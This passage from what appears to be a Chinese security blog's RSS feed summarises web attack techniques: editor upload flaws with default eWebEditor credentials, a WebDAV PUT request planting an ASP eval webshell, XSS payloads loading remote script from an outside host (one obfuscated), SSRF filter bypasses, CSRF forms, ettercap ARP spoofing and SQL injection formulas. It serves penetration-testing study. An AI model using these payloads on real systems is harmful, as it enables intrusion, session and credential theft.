1、敏感信息暴漏 * 查看版本信息 /FCKeditor/editor/dialog/fck_about.html * 默认上传页面 /FCKeditor/editor/filemanager/browser/default/browser.html /FCKeditor/editor/filemanager/browser/default/connectors/test.html /FCKeditor/editor/filemanager/upload/test.html /FCKeditor/editor/filemanager/connectors/test.html /FCKeditor/editor/filemanager/connectors/uploadtest.html * 其他敏感文件 /FCKeditor/editor/filemanager/connectors/aspx/connector.html /FCKeditor/editor/filemanager/connectors/asp/connector.html /FCKeditor/editor/filemanager/connectors/php/connector.php 2、黑名单策略错误 FCKeditor&amp;lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名 3、任意文件上传漏洞 FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行， 在form中的action=&amp;quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&amp;quot; 即可，然后上传  0x02 eWebEditor 1、默认后台 2.80以前为：ewebeditor/admin_login.asp 2.80以后为：admin/login.asp 2、默认账号密码 admin admin888 3、数据库地址 默认数据库地址 ewebeditor/db/ewebeditor.mdb 常用数据库地址 ewebeditor/db/ewebeditor.asa ewebeditor/db/ewebeditor.asa ewebeditor/db/#ewebeditor.asa ewebeditor/db/#ewebeditor.mdb ewebeditor/db/!@#ewebeditor.asp ewebeditor/db/ewebeditor1033.mdb asp asa为后缀的数据库下载下来后改为mdb  
Reference(侵删)：  http://navisec.it/编辑器漏洞手册/  </description>
    </item>
    
    <item>
      <title>文件上传之绕过上传漏洞</title>
      <link>http://wyb0.com/posts/file-upload-simple-to-bypass/</link>
      <pubDate>Wed, 20 Jul 2016 17:04:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-simple-to-bypass/</guid>
      <description>0x00 一般防止上传漏洞手法 1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证 //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少 //服务器开销，而服务端验证才可以真正防御攻击者。 2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法  0x01 客户端检测 客户端验证代码形如下：
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;图片上传&amp;lt;/title&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; function checkFile(){ var flag = false; var str = document.getElementById(&amp;quot;file&amp;quot;).value; str = str.substring(str.lastIndexOf(&#39;.&#39;) + 1); var arr = new Array(&#39;png&#39;,&#39;bmp&#39;,&#39;gif&#39;,&#39;jpg&#39;); for (var i=0;i&amp;lt;arr.length;i++){ if(str==arr[i]){ flag = true; } } if(!flag){ alert(&#39;文件不合法！&#39;); } return flag; } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;quot;upload.php&amp;quot; method=&amp;quot;post&amp;quot; onsubmit=&amp;quot;checkFile()&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot; name=&amp;quot;submit&amp;quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  接收文件的脚本upload.</description>
    </item>
    
    <item>
      <title>文件上传之解析漏洞</title>
      <link>http://wyb0.com/posts/file-upload-parse-vulnerability/</link>
      <pubDate>Wed, 20 Jul 2016 16:08:17 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-parse-vulnerability/</guid>
      <description>0x00 解析漏洞 文件上传漏洞通常与Web容器的解析漏洞配合利用 常见Web容器有IIS、Nginx、Apache、Tomcat等  0x01 IIS解析漏洞 IIS6.0在解析文件时存在以下两个解析漏洞
1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。 2、当文件名为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。  WebDav漏洞
 WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若 支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。 测试步骤如下： 1）通过OPTIONS探测服务器所支持的HTTP方法 请求： OPTIONS / HTTP/1.1 Host: www.xxxx.com 2)通过PUT方法向服务器上传shell 请求： PUT /a.txt HTTP/1.1 Host: www.xxxx.com Content-Length: 30 &amp;lt;%eval request(&amp;quot;chopper&amp;quot;) %&amp;gt; 3)通过Move或Copy方法改名 请求： COPY /a.txt HTTP/1.1 Host: www.xxxx.com Destination: http://www.xxxx.com/cmd.asp 4)用DELETE方法删除文件 请求： DELETE /a.txt HTTP/1.1 Host: www.xxxx.com 注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞  0x02 Apache解析漏洞 在Apache 1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件&amp;quot;/conf/mime.types&amp;quot;中配置Apache可以识别的文件名  0x03 Nginx解析漏洞 对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击 如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php  0x04 PHP CGI解析漏洞 当php的配置文件中的选项cgi.</description>
    </item>
    
    <item>
      <title>文件上传漏洞</title>
      <link>http://wyb0.com/posts/file-upload-vulnerabilities/</link>
      <pubDate>Wed, 20 Jul 2016 11:30:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-vulnerabilities/</guid>
      <description> 0x00 文件上传漏洞 当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的 脚本文件时，就有可能控制整个网站甚至是服务器，这就是文件上传漏洞。  0x01 权限 1. 后台权限：登陆了后台，可以进行一些操作、配置 2. 网站权限：获得了webshell，可以进行查看源代码等操作 3. 服务器权限：可以对服务器进行任意操作  0x02 漏洞分类 1. 配置不当可直接上传shell HTTP的PUT方法开启了 2. 文件解析漏洞导致文件执行 Web容器解析漏洞 3. 本地文件上传限制被绕过 BurpSuite抓包修改即可绕过 4. 服务端过滤不严或被绕过 使用了黑名单过滤 5. 文件路径截断上传 00截断等 6. 开源编辑器上传漏洞 如CKEditor(FCKeditor的新版)、eWebEditor的漏洞  0x03 利用条件 1. 首先,上传的文件能够被web容器解释执行。所以文件上传后的目录要是web容器所覆盖到的路径 2. 其次,用户能从web访问这个文件 3. 最后,用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容,则可能导致攻击失败  0x04 漏洞挖掘 1. 查找上传点，如图片、附件、头像的上传等 2. 找类似upload的目录、类似upload.php的文件 3. 找编辑器目录，如eWebEdirot、fckeditor、kingeditor等  0x05 常见可执行文件后缀 可用于绕过： php php2 php3 php5 phtml asp aspx ascx ashx cer asa jsp jspx jspf  </description>
    </item>
    
    <item>
      <title>XSS实例</title>
      <link>http://wyb0.com/posts/xss-example/</link>
      <pubDate>Sun, 17 Jul 2016 23:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-example/</guid>
      <description> 首先感谢凯神的指导
0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可：
&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a  但是这个要在点击删除时payload才起作用 也可用&amp;lt;img src=1 onerror=alert(1) /&amp;gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js  0x03 加载自己的js  此时的限制条件为：  * 30个字符 * script标签不能自己触发   只能构造类似下面的语句自己加载脚本：  a=document.createElement(&#39;script&#39;); a.src=&amp;quot;www.xxx.com&amp;quot;; document.head.appendChild(a);   可以用如下方法分割，多次添加：  a=document.createE/* */lement(&#39;script&#39;);/* */a.src=&amp;quot;www.xxx.com&amp;quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行   查找  构造payload   使用如下payload： &amp;lt;svg/onload=&amp;quot;b=&#39;http://t.i&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;b+=&#39;m/16ap6&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;$loadJs(b)&amp;quot;&amp;gt;  0x04 得到Cookie </description>
    </item>
    
    <item>
      <title>XSS漏洞挖掘与利用</title>
      <link>http://wyb0.com/posts/xss-use-and-defense/</link>
      <pubDate>Fri, 15 Jul 2016 16:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-use-and-defense/</guid>
      <description>0x00 XSS的检测 检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测
手工检测：检测结果准确，但对于大型web来说费时费力
软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出
检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出
 手工检测
可得知输出位置: • 输入敏感字符，如&amp;lt;、&amp;gt;、&amp;quot;、&#39;、()等，然后在提交后查看html源代码，看这些字符是否被转义。 • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA&amp;lt;&amp;gt;&amp;quot;&amp;amp;&#39;()”字符串，然后查找AAAAAA或许比较方便。 无法得知输出位置: 很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如： 在标签中：&amp;lt;div&amp;gt;XSS Test&amp;lt;/div&amp;gt; 在属性内：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;content&amp;quot; value=&amp;quot;XSS Test&amp;quot; /&amp;gt; 这种情况通常采用输入&amp;quot;/&amp;gt;XSS Test来测试。  全自动检测XSS 如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。
专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(www.domxssscanner.com)。
一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。
  0x01 XSS的挖掘与利用  XSS漏洞挖掘
反射型XSS： 一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严 存储型XSS： 可以提交内容 提交的内容可被管理员或其他用户看到 提交的内容没有被过滤或过滤不严  XSS漏洞利用 XSS一般就是闭合标签，和SQL注入类似，常见payload如下：
• &amp;lt;script src=&#39;http://b.ioio.pub/xss/probe.js&#39;&amp;gt;&amp;lt;/script&amp;gt; • &amp;lt;img src=x onerror=&amp;quot;s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b.ioio.pub/xss/probe.js&#39;&amp;quot;;&amp;gt; • &amp;lt;svg onload=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b.ioio.pub/xss/probe.js&amp;gt; • &amp;lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99, 114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59, 115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47, 112,114,111,98,101,46,106,115)) &amp;gt;   0x03 XSS简单示例 反射型xss简单示例: • &amp;lt;?</description>
    </item>
    
    <item>
      <title>XSS初识</title>
      <link>http://wyb0.com/posts/xss-basis/</link>
      <pubDate>Fri, 15 Jul 2016 10:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-basis/</guid>
      <description>0x00 简介 XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;rdquo;脚本&amp;rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
0x01 危害 JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
• 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等  0x02 攻击场景 在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等  0x03 分类 主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。
 反射型XSS
  反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
简单流程： 1. 用户访问带有XSS代码的URL请求 2. 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 3. 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： 1. 用户aaa在网站www.xxx.com浏览网页 2. 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 3. 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com 4. hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 5. 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com 6. hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息   存储型XSS
  存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</description>
    </item>
    
    <item>
      <title>无线下ettercap做中间人攻击</title>
      <link>http://wyb0.com/posts/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</link>
      <pubDate>Wed, 13 Jul 2016 09:22:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</guid>
      <description> 前提：攻击主机和被攻击主机在一个无线下面
0x00 打开ettercap 0x01 查看host列表 在软件的图形化界面点击sniff，选择unified sniffing选择网卡，然后单击hosts选项，选择scan for host，然后选择host list 0x02 选定攻击目标 选择192.168.1.116的IP地址，点击Add to Target 1,然后选择网关的IP地址192.168.1.1，点击Add to Target 2 0x03 开始攻击 ettercap选择&amp;quot;mitm&amp;quot;—&amp;quot;arp poisoning&amp;quot;—&amp;quot;Sniff remote connections&amp;quot;— &amp;quot;确定&amp;quot;，然后再在被攻击端查看arp，可知攻击已经成功 0x04 ettercap持续监听目标 软件上开始监听，被攻击端用浏览器登录路由器 0x05 得到Cookie 点击主界面的&amp;rdquo;View&amp;rdquo; — &amp;ldquo;connetcions&amp;rdquo; 可以查看被攻击主机的一些网络链接 0x06 用cookie登陆被入侵账户 打开火狐浏览器，通过firebug插件添加截获到的cookie从而登陆账户 </description>
    </item>
    
    <item>
      <title>SSRF</title>
      <link>http://wyb0.com/posts/ssrf/</link>
      <pubDate>Thu, 30 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ssrf/</guid>
      <description>0x00 什么是SSRF SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。
当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。
0x01 SSRF的危害 可以扫描内部网络
可以构造数据攻击内部主机
0x02 漏洞挖掘 其实只要能对外发起网络请求就有可能存在SSRF漏洞。
1. 从WEB功能上寻找 通过URL分享内容 文件处理、编码处理、转码等服务 在线翻译 通过URL地址加载与下载图片 图片、文章的收藏 设置邮件接收服务器 2. 从URL关键字寻找 share、wap、url、link、src、source、target、u、3g、 display、sourceURl、imageURL、domain...  0x03 漏洞验证 http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png 1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png， 说明不存在SSRF漏洞。 2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png 这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。  0x04 绕过过滤 有时漏洞利用时会遇到IP限制，可用如下方法绕过：
* 使用@：http://A.com@10.10.10.10 = 10.10.10.10 * IP地址转换成十进制、八进制：127.0.0.1 = 2130706433 * 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx * 端口绕过：ip后面加一个端口 * xip.io：10.0.0.1.xip.io = 10.0.0.1 www.10.0.0.1.xip.io = 10.0.0.1 mysite.10.0.0.1.xip.io = 10.0.0.1 foo.bar.10.0.0.1.xip.io = 10.0.0.1 * 通过js跳转  0x05 通用的SSRF实例  weblogin配置不当，天生ssrf漏洞 discuz x2.</description>
    </item>
    
    <item>
      <title>sqlmapapi的简单使用</title>
      <link>http://wyb0.com/posts/sqlmapapi-usage/</link>
      <pubDate>Tue, 28 Jun 2016 11:19:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/sqlmapapi-usage/</guid>
      <description>0x00 关于sqlmapapi.py 当利用sqlmap时一次只能测试一个url，效率很低，而用sqlmapapi就可以实现批量
0x01 用于交互的方法 在sqlmap/lib/utils/api.py中:
# 用户方法 @get(&amp;quot;/task/new&amp;quot;) Create new task ID. @get(&amp;quot;/task/&amp;lt;taskid&amp;gt;/delete&amp;quot;) Delete own task ID. # 管理函数 @get(&amp;quot;/admin/&amp;lt;taskid&amp;gt;/list&amp;quot;) List task pull. @get(&amp;quot;/admin/&amp;lt;taskid&amp;gt;/flush&amp;quot;) Flush task spool (delete all tasks). # 核心交互函数 @get(&amp;quot;/option/&amp;lt;taskid&amp;gt;/list&amp;quot;) List options for a certain task ID @post(&amp;quot;/option/&amp;lt;taskid&amp;gt;/get&amp;quot;) Get the value of an option (command line switch) for a certain task ID @post(&amp;quot;/option/&amp;lt;taskid&amp;gt;/set&amp;quot;) Set an option (command line switch) for a certain task ID @post(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/start&amp;quot;) Launch a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/stop&amp;quot;) Kill a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/status&amp;quot;) Return status of a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/data&amp;quot;) Retrieve the data of a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/log/&amp;lt;start&amp;gt;/&amp;lt;end&amp;gt;&amp;quot;) Retrieve a subset of log messages @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/log&amp;quot;) Retrieve the log messages @get(&amp;quot;/download/&amp;lt;taskid&amp;gt;/&amp;lt;target&amp;gt;/&amp;lt;filename:path&amp;gt;&amp;quot;) Download a certain file from the file system  0x02 sqlmapapi.</description>
    </item>
    
    <item>
      <title>CSRF漏洞</title>
      <link>http://wyb0.com/posts/csrf/</link>
      <pubDate>Tue, 28 Jun 2016 09:21:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/csrf/</guid>
      <description>0x00 概念 当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。
CSRF就是：攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾认证过的网站并执行某些操作。也可以说CSRF就是黑客利用受害者的Cookie骗取服务器的信任从而执行某些操作
0x01 利用  利用条件
 攻击者可以得知url的所有参数项并了解其含义 诱导用户访问构造好的POC  利用地方
 操作是有意义的(比如:修改密码等) 验证过于简单(参数固定、我们可以设置参数)   0x02 GET型CSRF攻击 若有论坛www.aa.com，论坛删除文章的操作是请求类似 http://www.aa.com/opt.php?id=135&amp;amp;act=del&amp;amp;name=Tom的链接  有用户A，他登陆了论坛，且有篇文章id为251，那么他的浏览器此时已经取得了论坛的信任  此时有hacker用户B，他构造了一个html为b.html，b.html内容如下： &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;img src=&amp;quot;http://www.aa.com/opt.php?id=251&amp;amp;act=del&amp;amp;name=A&amp;quot; /&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 将b.html放在他自己搭建的网站上，网址为http://www.bb.com/b.html  恶意用户B将链接http://www.bb.com/b.html通过qq发送给用户A， 诱使他访问，用户A一旦访问，他id为251的文章就会被删除  0x03 POST型CSRF攻击 若网站www.xx.com有让用户修改密码的功能，但验证过于简单，形如下图： &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;aa&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;quot;http://172.23.10.200/setpasswd.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt; 昵称：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;nickname&amp;quot; id=&amp;quot;nickname&amp;quot; value=&amp;quot;xxxxx&amp;quot;&amp;gt; 用户名：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;name&amp;quot; id=&amp;quot;name&amp;quot; value=&amp;quot;xiaoming&amp;quot;&amp;gt; 密码：&amp;lt;input type=&amp;quot;passwd&amp;quot; name=&amp;quot;passwd&amp;quot; id=&amp;quot;passwd&amp;quot; value=&amp;quot;&amp;quot;&amp;gt; 确认密码：&amp;lt;input type=&amp;quot;rpasswd&amp;quot; name=&amp;quot;rpasswd&amp;quot; id=&amp;quot;rpasswd&amp;quot; value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;button&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  此时我们就可以构造自动提交表单的xxxx.</description>
    </item>
    
    <item>
      <title>SQL注入之宽字节注入</title>
      <link>http://wyb0.com/posts/injection-of-wide-byte/</link>
      <pubDate>Fri, 24 Jun 2016 10:25:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-wide-byte/</guid>
      <description>0x00 应用场景 在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&amp;quot;\&amp;quot;转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。
0x01 测试代码 &amp;lt;?php $conn = mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;); mysql_select_db(&#39;messages&#39;,$conn); if (isset($_GET[&#39;id&#39;])) { $id = addslashes($_GET[&#39;id&#39;]); //转义id $sql = &amp;quot;select * from msg where id=&#39;$id&#39;;&amp;quot;; echo $sql.&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $result = mysql_query($sql); $rows = @mysql_fetch_assoc($result); if ($rows) { echo &#39;&amp;lt;table align=&amp;quot;left&amp;quot; border=&amp;quot;1&amp;quot;&amp;gt;&#39;; foreach ($rows as $key =&amp;gt; $value) { echo &#39;&amp;lt;tr align=&amp;quot;lift&amp;quot; height=&amp;quot;30&amp;quot;&amp;gt;&#39;; echo &#39;&amp;lt;td&amp;gt;&#39;.$key.&#39;----&#39;.$value.&#39;&amp;lt;/td&amp;gt;&#39;; echo &#39;&amp;lt;/tr&amp;gt;&#39;; } echo &#39;&amp;lt;/table&amp;gt;&#39;; } else { echo mysql_error(); } } else { echo &amp;quot;please input id.</description>
    </item>
    
    <item>
      <title>SQL注入之防御</title>
      <link>http://wyb0.com/posts/injection-of-defense/</link>
      <pubDate>Thu, 23 Jun 2016 15:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-defense/</guid>
      <description>0x00 要做的事 也就是找到注入点然后修复
0x01 防御方法  使用转义函数
如：addslashes()和mysql_real_escape_string()
在php.ini设置auto_prepend_file自动在脚本执行前在首部加载文件
&amp;lt;?php //简单过滤 $filter = array(&amp;amp;$_GET,&amp;amp;$_POST,&amp;amp;$_COOKIE); foreach ($filter as $key =&amp;gt; $value){ foreach ($value as $k =&amp;gt; $v){ $filter[$key][$k] = mysql_real_escape_string($v); } } ?&amp;gt;  检查数据类型
使用(int)或settype()等将数字等进行强制转换
对邮箱、日期等也进行检查
 使用预编译语句绑定变量(一般为防御SQL注入的最佳方式)
&amp;lt;?php //预编译 $mysqli = new mysqli(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;123456&amp;quot;,&amp;quot;share&amp;quot;); $mysqli-&amp;gt;query(&amp;quot;set names utf8&amp;quot;); $sql = &amp;quot;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;quot;; $s = $mysqli-&amp;gt;prepare($sql); //绑定参数 $name = &amp;quot;Tom&amp;quot;; $sex = &amp;quot;M&amp;quot;; $age = 23; $s-&amp;gt;bind_param(&amp;quot;ssi&amp;quot;,$name,$sex,$age);//ssi的意思是字符、字符、整型 //执行 $result = $s-&amp;gt;execute(); var_dump($result); $s-&amp;gt;close(); ?</description>
    </item>
    
    <item>
      <title>SQL注入之布尔型注入</title>
      <link>http://wyb0.com/posts/injection-of-boolian-based/</link>
      <pubDate>Wed, 22 Jun 2016 23:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-boolian-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位，且没有用echo &amp;quot;mysql_error()&amp;quot;输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用  0x01 利用方式 用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+ 根据返回页面是否相同来得到数据  0x02 注入步骤  找到注入点，判断闭合字符  尝试猜解列数，得到显示位  得到数据库名 最终得到第五个数据库名为security
 得到表名 最终依次猜的表名为users
 得到列名 同理最终得到第2列列名为username，第3列列名为password
 得到列值 依次得到为admin4，同理可得其他数据
  0x04 附上python脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber &amp;lt;1070018473@qq.com&amp;gt; __author__=&amp;quot;reber&amp;quot; import sys import requests import binascii import hashlib from pyfiglet import figlet_format from optparse import OptionParser def get_md5_html(url): html = requests.</description>
    </item>
    
    <item>
      <title>SQL注入之报错型注入</title>
      <link>http://wyb0.com/posts/injection-of-error-based/</link>
      <pubDate>Wed, 22 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-error-based/</guid>
      <description>0x00 前提 一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解  0x01 利用方式 报错注入只要套用公式即可，公式如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):
?id=2&amp;rsquo; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+
?id=2&amp;rsquo; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+
?id=1&amp;rsquo; and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+
0x02 公式解析 floor()是取整数 rand()在0和1之间产生一个随机数 rand(0)*2将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*)是用来统计结果的，相当于刷新一次结果 group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1 group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次  0x03 注入步骤  猜测闭合字符  猜测列数  尝试得到显示位  报错得到数据库个数  报错得到数据库名  报错得到表名  报错得到列名  得到列值   0x04 附上利用代码 #!</description>
    </item>
    
    <item>
      <title>SQL注入之联合查询</title>
      <link>http://wyb0.com/posts/injection-of-union-select/</link>
      <pubDate>Tue, 21 Jun 2016 22:30:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-union-select/</guid>
      <description> 0x00 前提 要用联合查询进行注入则：页面必须有显示位
0x01 联合查询 union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同
0x02 注入步骤  找到注入点得到闭合字符  判断数据库类型  猜解列数，得到显示位  得到基本信息(数据库名、版本、数据库版本等)  得到数据库  得到security数据库的表名  猜解列名  猜解数据   </description>
    </item>
    
    <item>
      <title>SQL注入之MySQL函数利用</title>
